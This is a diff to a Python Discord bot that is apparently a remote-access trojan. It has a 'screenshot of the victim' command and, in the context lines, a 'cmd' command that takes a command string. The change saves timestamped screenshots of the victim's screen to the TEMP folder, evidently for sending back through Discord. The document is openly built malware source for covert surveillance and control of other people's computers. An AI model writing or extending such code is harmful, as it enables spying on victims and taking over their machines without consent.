@@ -53,13 +53,15 @@ async def cmd(interaction: discord.Interaction, command: str):
 
 @bot.tree.command(name="screenshot", description="get a screenshot of the victim")
 async def ping(interaction: discord.Interaction):
-	img = takeScreenshot()
+	name, path = takeScreenshot()
 	await interaction.response.send_message()
 
 
 def takeScreenshot():
-	img = pyautogui.screenshot()
-	return img
+	name = time.strftime("%Y%m%d-%H%M%S.jpg")
+	path = join(os.getenv("TEMP"), name)
+	img = pyautogui.screenshot(path)
+	return name, path
 
 
 bot.run(token=Token)
